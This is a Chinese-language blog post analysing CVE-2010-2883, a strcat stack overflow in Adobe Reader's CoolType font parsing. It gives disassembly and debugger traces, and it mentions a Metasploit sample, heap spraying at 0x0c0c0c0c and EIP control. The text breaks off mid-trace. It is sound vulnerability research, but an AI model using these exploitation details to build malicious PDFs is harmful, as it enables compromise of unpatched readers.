<!DOCTYPE html>












  


<html class="theme-next gemini use-motion" lang="en">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">

<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
<style>
    .pace .pace-progress {
        background: #1E92FB; /*进度条颜色*/
        height: 3px;
    }
    .pace .pace-progress-inner {
         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
    }
    .pace .pace-activity {
        border-top-color: #1E92FB;    /*上边框颜色*/
        border-left-color: #1E92FB;    /*左边框颜色*/
    }
</style>

























<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">

<link rel="stylesheet" href="/css/main.css?v=6.7.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.7.0">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=6.7.0">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=6.7.0">


  <link rel="mask-icon" href="/images/logo.svg?v=6.7.0" color="#222">







<script id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '6.7.0',
    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>


  




  <meta name="description" content="从备份失败的老博客还原出来的">
<meta name="keywords" content="old_blog,vuln">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2010-2883">
<meta property="og:url" content="https://vsane.github.io/2019/01/09/CVE-2010-2883/index.html">
<meta property="og:site_name" content="V4kst1z&#39;s Blog">
<meta property="og:description" content="从备份失败的老博客还原出来的">
<meta property="og:locale" content="en">
<meta property="og:image" content="http://static.zybuluo.com/dane909/ifewcvpsv7pzzuu009nwg55x/QQ%E6%88%AA%E5%9B%BE20180708170440.png">
<meta property="og:image" content="http://static.zybuluo.com/dane909/7anwbklc7e552lkdj6lg24lj/20180708185531.png">
<meta property="og:image" content="http://static.zybuluo.com/dane909/dwhnt7ch0zrnmufm416r773c/singtbl.png">
<meta property="og:image" content="http://static.zybuluo.com/dane909/srgdwjkvpt70qqmkbsk8tn5a/123.png">
<meta property="og:image" content="http://static.zybuluo.com/dane909/5be8yjsxc24i2hnrroknmwkc/QQ%E6%88%AA%E5%9B%BE20180708194913.png">
<meta property="og:image" content="http://static.zybuluo.com/dane909/ueskqxzz6c6mafr21yfvip08/QQ%E6%88%AA%E5%9B%BE20180708195541.png">
<meta property="og:image" content="http://static.zybuluo.com/dane909/6bdnh01djukp056nlcfz6enx/eee.png">
<meta property="og:image" content="http://static.zybuluo.com/dane909/zgwj57idm9fd1zj4jxaf3nw1/fff.png">
<meta property="og:image" content="http://static.zybuluo.com/dane909/uiygcjhivcupw0d7euv9ft38/ggg.png">
<meta property="og:image" content="http://static.zybuluo.com/dane909/39u8io5zaa7z37msn91zijiz/ffss.png">
<meta property="og:updated_time" content="2019-01-09T09:26:37.693Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CVE-2010-2883">
<meta name="twitter:description" content="从备份失败的老博客还原出来的">
<meta name="twitter:image" content="http://static.zybuluo.com/dane909/ifewcvpsv7pzzuu009nwg55x/QQ%E6%88%AA%E5%9B%BE20180708170440.png">



  <link rel="alternate" href="/atom.xml" title="V4kst1z's Blog" type="application/atom+xml">




  <link rel="canonical" href="https://vsane.github.io/2019/01/09/CVE-2010-2883/">



<script id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>CVE-2010-2883 | V4kst1z's Blog</title>
  












  <noscript>
  <style>
  .use-motion .motion-element,
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-title { opacity: initial; }

  .use-motion .logo,
  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="en">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">V4kst1z's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="Toggle navigation bar">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home">

    
    
    
      
    

    

    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">

    
    
    
      
    

    

    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-tags">

    
    
    
      
    

    

    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tag"></i> <br>Tags</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-about">

    
    
    
      
    

    

    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>

  </li>

      
      
    </ul>
  

  

  
</nav>



  



</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
            

          
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://vsane.github.io/2019/01/09/CVE-2010-2883/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="V4kst1z">
      <meta itemprop="description" content="Bin Dog">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="V4kst1z's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">CVE-2010-2883

              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2019-01-09 15:40:08 / Modified: 17:26:37" itemprop="dateCreated datePublished" datetime="2019-01-09T15:40:08+08:00">2019-01-09</time>
            

            
              

              
            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2019/01/09/CVE-2010-2883/#comments" itemprop="discussionUrl">
                  <span class="post-meta-item-text">Comments: </span> <span class="post-comments-count valine-comment-count" data-xid="/2019/01/09/CVE-2010-2883/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          
            <span class="post-meta-divider">|</span>
            <span class="post-meta-item-icon">
            <i class="fa fa-eye"></i>
             Views:  
            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
            </span>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>从备份失败的老博客还原出来的<br><a id="more"></a></p>
<h2 id="漏洞概览"><a href="#漏洞概览" class="headerlink" title="漏洞概览"></a>漏洞概览</h2><p>本来想通过 <code>poc</code> 样本去定位漏洞地址，后来发现找的样本都无法定位到，感觉是我操作有问题，总是蹦出来异常处理，算了，就用泉哥用的上帝视角模式吧，直接通过漏洞点进行分析。<br><img src="http://static.zybuluo.com/dane909/ifewcvpsv7pzzuu009nwg55x/QQ%E6%88%AA%E5%9B%BE20180708170440.png" alt="QQ截图20180708170440.png-65.4kB"><br>漏洞点在<code>0x803ddab</code> 处，在调用 <code>strcat</code> 函数时没有对长度检查，造成溢出，并且有程序上下文可以猜测是在对字体处理时出现了问题。下面会详细分析这个漏洞是如何触发的，在分析之前需要先简单了解下 <code>pdf</code> 文件的结构，可以参考:<a href="https://zhuanlan.zhihu.com/p/30597307" target="_blank" rel="noopener">PDF文件解析与PDF恶代分析中的一些坑
</a></p>
<h2 id="触发条件"><a href="#触发条件" class="headerlink" title="触发条件"></a>触发条件</h2><p>我使用的样本是 <code>msf</code> 生成的可以弹出计算机的，原理都一样。先来了解下 <code>TTF</code> 字体的一些信息。<br>首先是 <code>tOffsetTable</code> 记录了表结构的信息，可以理解为一个总表吧。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tOffsetTable</span> &#123;</span></span><br><span class="line">	TT_Fixed SFNT_Ver;	<span class="comment">//sfnt version 0x00010000 for version 1.0. </span></span><br><span class="line">	USHORT  numTables;	<span class="comment">//Number of tables.  </span></span><br><span class="line">	USHORT  searchRange;	<span class="comment">//(Maximum power of 2 &lt;= numTables) x 16. </span></span><br><span class="line">	USHORT  entrySelector;	<span class="comment">// Log2(maximum power of 2 &lt;= numTables). </span></span><br><span class="line">	USHORT  rangeShift;	<span class="comment">// NumTables x 16-searchRange. </span></span><br><span class="line">	&#125;;</span><br></pre></td></tr></table></figure></p>
<p>然后是 <code>tTable</code> 结构体，记录了相关表的偏移及大小。实际存储的时候会是一个数组，因为存了很多表，之后就是各个表的具体内容。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tTable</span> &#123;</span></span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">	<span class="keyword">char</span> asChar[<span class="number">4</span>];	<span class="comment">// 4 -byte identifier. </span></span><br><span class="line">	ULONG asLong;</span><br><span class="line">	&#125; Tag;</span><br><span class="line">	ULONG checkSum;	<span class="comment">// CheckSum for this table. </span></span><br><span class="line">	ULONG offset;	<span class="comment">// Offset from beginning of TrueType font file. </span></span><br><span class="line">	ULONG length;	<span class="comment">// Length of this table. </span></span><br><span class="line">	&#125;;</span><br></pre></td></tr></table></figure></p>
<p>可以通过 <code>010editor</code> 的模板功能进行查看，如下(字体数据结构是通过 <code>PdfStreamDumper</code>得到的)<br><img src="http://static.zybuluo.com/dane909/7anwbklc7e552lkdj6lg24lj/20180708185531.png" alt="20180708185531.png-27.6kB"><br><br><br><code>SING</code> 的结构如下图:<br><img src="http://static.zybuluo.com/dane909/dwhnt7ch0zrnmufm416r773c/singtbl.png" alt="singtbl.png-111.1kB"><br><br><br><br><br>下面我们看下实验的样本中 <code>SING</code> 结构的数据<br><img src="http://static.zybuluo.com/dane909/srgdwjkvpt70qqmkbsk8tn5a/123.png" alt="123.png-97.2kB"><br>先来简单分析下漏洞点附近的代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">push    offset aSing    ; <span class="string">"SING"</span></span><br><span class="line">push    edi             ; <span class="keyword">int</span></span><br><span class="line">lea     ecx, [ebp+<span class="number">108</span>h+var_12C]</span><br><span class="line">call    sub_8021B06</span><br><span class="line">mov     eax, [ebp+<span class="number">108</span>h+var_12C]</span><br><span class="line">cmp     eax, esi</span><br><span class="line">mov     byte ptr [ebp+<span class="number">108</span>h+var_10C], <span class="number">2</span></span><br><span class="line">jz      <span class="keyword">short</span> loc_803DDC4</span><br><span class="line">mov     ecx, [eax]</span><br><span class="line"><span class="keyword">and</span>     ecx, <span class="number">0F</span>FFFh</span><br><span class="line">jz      <span class="keyword">short</span> loc_803DD9F</span><br><span class="line">cmp     ecx, <span class="number">100</span>h</span><br><span class="line">jnz     <span class="keyword">short</span> loc_803DDC0</span><br><span class="line">add     eax, <span class="number">10</span>h</span><br><span class="line">push    eax             ; <span class="keyword">char</span> *</span><br><span class="line">lea     eax, [ebp+<span class="number">108</span>h+var_108]</span><br><span class="line">push    eax             ; <span class="keyword">char</span> *</span><br><span class="line">mov     [ebp+<span class="number">108</span>h+var_108], <span class="number">0</span></span><br><span class="line">call    <span class="built_in">strcat</span></span><br></pre></td></tr></table></figure></p>
<p>先看第一个函数 <code>sub_8021B06(ecx, edi, str_SING);</code>, 第一个参数是一个对象，但是现在并不能确定这个函数的作用，可以通过 <code>windbg</code> 加断点比较前后数据的变化来猜测。<br>先看下在函数执行前<br><img src="http://static.zybuluo.com/dane909/5be8yjsxc24i2hnrroknmwkc/QQ%E6%88%AA%E5%9B%BE20180708194913.png" alt="QQ截图20180708194913.png-125.5kB"><br>执行函数后再一次进行比较，可以猜到函数的作用是根据存储 <code>TTF</code> 数据的地址找到 <code>SING</code> 表结构的地址。<br><img src="http://static.zybuluo.com/dane909/ueskqxzz6c6mafr21yfvip08/QQ%E6%88%AA%E5%9B%BE20180708195541.png" alt="QQ截图20180708195541.png-139.6kB"><br>所以后面指令的作用基本就得到了，如下<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">push    offset aSing    ; <span class="string">"SING"</span></span><br><span class="line">push    edi             ; <span class="keyword">int</span></span><br><span class="line">lea     ecx, [ebp+<span class="number">108</span>h+var_12C]</span><br><span class="line">call    sub_8021B06      </span><br><span class="line">mov     eax, [ebp+<span class="number">108</span>h+var_12C]           ;eax = SING addr   </span><br><span class="line">cmp     eax, esi</span><br><span class="line">mov     byte ptr [ebp+<span class="number">108</span>h+var_10C], <span class="number">2</span>    </span><br><span class="line">jz      <span class="keyword">short</span> loc_803DDC4       </span><br><span class="line">mov     ecx, [eax]                        ;version</span><br><span class="line"><span class="keyword">and</span>     ecx, <span class="number">0F</span>FFFh              </span><br><span class="line">jz      <span class="keyword">short</span> loc_803DD9F                 </span><br><span class="line">cmp     ecx, <span class="number">100</span>h           </span><br><span class="line">jnz     <span class="keyword">short</span> loc_803DDC0                 </span><br><span class="line">add     eax, <span class="number">10</span>h                          ;SING+<span class="number">0x10</span> = SING-&gt;uniqueName</span><br><span class="line">push    eax             ; <span class="keyword">char</span> *          ;uniqueName</span><br><span class="line">lea     eax, [ebp+<span class="number">108</span>h+var_108]           ;<span class="built_in">stack</span> addr</span><br><span class="line">push    eax             ; <span class="keyword">char</span> *          </span><br><span class="line">mov     [ebp+<span class="number">108</span>h+var_108], <span class="number">0</span></span><br><span class="line">call    <span class="built_in">strcat</span></span><br></pre></td></tr></table></figure></p>
<p>所以现在漏洞很清晰啦，通过 <code>strcat</code> 函数将 <code>uniqueName</code> 的字符串来连接到栈地址，但是没有检查长度，造成溢出。<br><img src="http://static.zybuluo.com/dane909/6bdnh01djukp056nlcfz6enx/eee.png" alt="eee.png-134.8kB"><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">strcat</span><span class="params">(<span class="keyword">char</span> *dest, <span class="keyword">const</span> <span class="keyword">char</span> *src)</span></span>;</span><br></pre></td></tr></table></figure></p>
<p>虽然只是个栈溢出，但是因为软件过于复杂，并且还存在 <code>GS</code> 保护(虽然后面的利用 <code>GS</code> 没卵用)，所以利用起来难度还是很大的，至少对我这个菜鸡是这样，下面我们来看下是如何利用的。</p>
<h2 id="利用技巧"><a href="#利用技巧" class="headerlink" title="利用技巧"></a>利用技巧</h2><p>在 <code>strcat</code> 函数执行前查看帧栈信息，与执行后进行比较<br><img src="http://static.zybuluo.com/dane909/zgwj57idm9fd1zj4jxaf3nw1/fff.png" alt="fff.png-179.6kB"><br>可以看到栈上的数据的改动造成了相关帧栈信息的变动，例如 <code>0x0c0c0c0c</code>,可以很自然的想到 <code>heapspray</code>。<br>实际上面代码还有个很无法理解的地方<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0803</span>DCF9                 push    ebp</span><br><span class="line">.text:<span class="number">0803</span>DCFA                 sub     esp, <span class="number">104</span>h</span><br><span class="line">.text:<span class="number">0803</span>DD00                 lea     ebp, [esp<span class="number">-4</span>]</span><br></pre></td></tr></table></figure></p>
<p>编译器这样改 <code>ebp</code> 是为了优化??? 不懂<br>后面的通过栈上的可控变量控制 <code>eip</code> 这一步感觉实在想不出来，感觉可能是通过污点分析对可控数据监控，当遇到能通过 <code>call</code> 调用时记录下来，然后利用的。在 <code>0x0808B308</code> 处的指令可以通过栈上存储的值调用相应地址的指令，通过 <code>windbg</code> 跟踪来看下。<br><img src="http://static.zybuluo.com/dane909/uiygcjhivcupw0d7euv9ft38/ggg.png" alt="ggg.png-14.4kB"><br>跟踪直到运行到 <code>0808B308</code> 处，整理运行过的指令。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0803</span>ddb6 <span class="number">8b</span>cb            mov     ecx,ebx</span><br><span class="line"><span class="number">0803</span>ddb8 e88634fcff      call    CoolType+<span class="number">0x1243</span> (<span class="number">08001243</span>)</span><br><span class="line"><span class="number">0803</span>ddbd <span class="number">8b</span>45dc          mov     eax,dword ptr [ebp<span class="number">-24</span>h] ss:<span class="number">0023</span>:<span class="number">0012e4</span>b4=<span class="number">046</span>cb078</span><br><span class="line"><span class="number">0803</span>ddc0 c645ef01        mov     byte ptr [ebp<span class="number">-11</span>h],<span class="number">1</span>       ss:<span class="number">0023</span>:<span class="number">0012e4</span>c7=<span class="number">00</span></span><br><span class="line"><span class="number">0803</span>ddc4 <span class="number">3b</span>c6            cmp     eax,esi</span><br><span class="line"><span class="number">0803</span>ddc6 c645fc01        mov     byte ptr [ebp<span class="number">-4</span>],<span class="number">1</span>         ss:<span class="number">0023</span>:<span class="number">0012e4</span>d4=<span class="number">02</span></span><br><span class="line"><span class="number">0803</span>ddca <span class="number">7407</span>            je      CoolType+<span class="number">0x3ddd3</span> (<span class="number">0803</span>ddd3)             [br=<span class="number">0</span>]</span><br><span class="line"><span class="number">0803</span>ddcc <span class="number">50</span>              push    eax</span><br><span class="line"><span class="number">0803</span>ddcd e8ed3a0000      call    CoolType+<span class="number">0x418bf</span> (<span class="number">080418b</span>f)</span><br><span class="line"><span class="number">0803</span>ddd2 <span class="number">59</span>              pop     ecx</span><br><span class="line"><span class="number">0803</span>ddd3 <span class="number">807</span>def00        cmp     byte ptr [ebp<span class="number">-11</span>h],<span class="number">0</span>       ss:<span class="number">0023</span>:<span class="number">0012e4</span>c7=<span class="number">01</span></span><br><span class="line"><span class="number">0803</span>ddd7 <span class="number">0f</span>85cc000000    jne     CoolType+<span class="number">0x3dea9</span> (<span class="number">0803</span>dea9)             [br=<span class="number">1</span>]</span><br><span class="line"><span class="number">0803</span>dea9 <span class="number">8</span>d45e4          lea     eax,[ebp<span class="number">-1</span>Ch]</span><br><span class="line"><span class="number">0803</span>deac <span class="number">50</span>              push    eax</span><br><span class="line"><span class="number">0803</span>dead <span class="number">53</span>              push    ebx</span><br><span class="line"><span class="number">0803</span>deae <span class="number">57</span>              push    edi</span><br><span class="line"><span class="number">0803</span>deaf e82a8dfdff      call    CoolType+<span class="number">0x16bde</span> (<span class="number">08016b</span>de)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">08016b</span>de <span class="number">55</span>              push    ebp</span><br><span class="line"><span class="number">08016b</span>df <span class="number">81</span>ec60060000    sub     esp,<span class="number">660</span>h</span><br><span class="line"><span class="number">08016b</span>e5 <span class="number">8</span>d6c24fc        lea     ebp,[esp<span class="number">-4</span>]</span><br><span class="line"><span class="number">08016b</span>e9 a1b80f2308      mov     eax,dword ptr [CoolType!CTCleanup+<span class="number">0xe26ee</span> (<span class="number">08230f</span>b8)] ds:<span class="number">0023</span>:<span class="number">08230f</span>b8=<span class="number">67f</span>be93a</span><br><span class="line"><span class="number">08016b</span>ee <span class="number">33</span>c5            xor     eax,ebp</span><br><span class="line"><span class="number">08016b</span>f0 <span class="number">898560060000</span>    mov     dword ptr [ebp+<span class="number">660</span>h],eax ss:<span class="number">0023</span>:<span class="number">0012e458</span>=<span class="number">0012e4</span>cc</span><br><span class="line"><span class="number">08016b</span>f6 <span class="number">6</span>a50            push    <span class="number">50</span>h</span><br><span class="line"><span class="number">08016b</span>f8 b8325d1708      mov     eax,offset CoolType!CTCleanup+<span class="number">0x27468</span> (<span class="number">08175</span>d32)</span><br><span class="line"><span class="number">08016b</span>fd e8cf150300      call    CoolType!CTInit+<span class="number">0x1b2e</span> (<span class="number">080481</span>d1)</span><br><span class="line"><span class="number">08016</span>c02 <span class="number">8b</span>8574060000    mov     eax,dword ptr [ebp+<span class="number">674</span>h] ss:<span class="number">0023</span>:<span class="number">0012e46</span>c=<span class="number">0012e4</span>bc</span><br><span class="line"><span class="number">08016</span>c08 <span class="number">8b</span>b570060000    mov     esi,dword ptr [ebp+<span class="number">670</span>h] ss:<span class="number">0023</span>:<span class="number">0012e468</span>=<span class="number">0012e608</span></span><br><span class="line"><span class="number">08016</span>c0e <span class="number">8b</span>bd6c060000    mov     edi,dword ptr [ebp+<span class="number">66</span>Ch] ss:<span class="number">0023</span>:<span class="number">0012e464</span>=<span class="number">0012e718</span></span><br><span class="line"><span class="number">08016</span>c14 <span class="number">8945</span>a8          mov     dword ptr [ebp<span class="number">-58</span>h],eax ss:<span class="number">0023</span>:<span class="number">0012</span>dda0=ffeb0000</span><br><span class="line"><span class="number">08016</span>c17 b850a62308      mov     eax,offset CoolType!CTCleanup+<span class="number">0xebd86</span> (<span class="number">0823</span>a650)</span><br><span class="line"><span class="number">08016</span>c1c <span class="number">50</span>              push    eax</span><br><span class="line"><span class="number">08016</span>c1d <span class="number">8975e4</span>          mov     dword ptr [ebp<span class="number">-1</span>Ch],esi ss:<span class="number">0023</span>:<span class="number">0012</span>dddc=<span class="number">1200b</span>8e7</span><br><span class="line"><span class="number">08016</span>c20 <span class="number">8945</span>a4          mov     dword ptr [ebp<span class="number">-5</span>Ch],eax ss:<span class="number">0023</span>:<span class="number">0012</span>dd9c=<span class="number">00000001</span></span><br><span class="line"><span class="number">08016</span>c23 ff1530f11808    call    dword ptr [CoolType!CTCleanup+<span class="number">0x40866</span> (<span class="number">0818f</span>130)] ds:<span class="number">0023</span>:<span class="number">0818f</span>130=&#123;ntdll!RtlEnterCriticalSection (<span class="number">7</span>c921000)&#125;</span><br><span class="line"><span class="number">08016</span>c29 <span class="number">33</span>db            xor     ebx,ebx</span><br><span class="line"><span class="number">08016</span>c2b <span class="number">57</span>              push    edi</span><br><span class="line"><span class="number">08016</span>c2c <span class="number">895</span>dfc          mov     dword ptr [ebp<span class="number">-4</span>],ebx ss:<span class="number">0023</span>:<span class="number">0012</span>ddf4=ffffffff</span><br><span class="line"><span class="number">08016</span>c2f <span class="number">895</span>dd0          mov     dword ptr [ebp<span class="number">-30</span>h],ebx ss:<span class="number">0023</span>:<span class="number">0012</span>ddc8=<span class="number">1200b</span>8e7</span><br><span class="line"><span class="number">08016</span>c32 <span class="number">895</span>dec          mov     dword ptr [ebp<span class="number">-14</span>h],ebx ss:<span class="number">0023</span>:<span class="number">0012</span>dde4=<span class="number">81234378</span></span><br><span class="line"><span class="number">08016</span>c35 e8e24e0000      call    CoolType+<span class="number">0x1bb1c</span> (<span class="number">0801b</span>b1c)</span><br><span class="line"><span class="number">08016</span>c3a <span class="number">3b</span>c3            cmp     eax,ebx</span><br><span class="line"><span class="number">08016</span>c3c <span class="number">59</span>              pop     ecx</span><br><span class="line"><span class="number">08016</span>c3d <span class="number">8945e8</span>          mov     dword ptr [ebp<span class="number">-18</span>h],eax ss:<span class="number">0023</span>:<span class="number">0012</span>dde0=<span class="number">8</span>d235d88</span><br><span class="line"><span class="number">08016</span>c40 <span class="number">0f</span>8488060000    je      CoolType+<span class="number">0x172ce</span> (<span class="number">080172</span>ce)             [br=<span class="number">0</span>]</span><br><span class="line"><span class="number">08016</span>c46 <span class="number">6</span>a01            push    <span class="number">1</span></span><br><span class="line"><span class="number">08016</span>c48 <span class="number">53</span>              push    ebx</span><br><span class="line"><span class="number">08016</span>c49 <span class="number">53</span>              push    ebx</span><br><span class="line"><span class="number">08016</span>c4a <span class="number">8</span>d45ec          lea     eax,[ebp<span class="number">-14</span>h]</span><br><span class="line"><span class="number">08016</span>c4d <span class="number">50</span>              push    eax</span><br><span class="line"><span class="number">08016</span>c4e <span class="number">8</span>d45d0          lea     eax,[ebp<span class="number">-30</span>h]</span><br><span class="line"><span class="number">08016</span>c51 <span class="number">50</span>              push    eax</span><br><span class="line"><span class="number">08016</span>c52 <span class="number">57</span>              push    edi</span><br><span class="line"><span class="number">08016</span>c53 ff75e8          push    dword ptr [ebp<span class="number">-18</span>h]  ss:<span class="number">0023</span>:<span class="number">0012</span>dde0=<span class="number">01</span>efc87c</span><br><span class="line"><span class="number">08016</span>c56 e8c64e0000      call    CoolType+<span class="number">0x1bb21</span> (<span class="number">0801b</span>b21)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">0801b</span>b21 <span class="number">55</span>              push    ebp</span><br><span class="line"><span class="number">0801b</span>b22 <span class="number">8b</span>ec            mov     ebp,esp</span><br><span 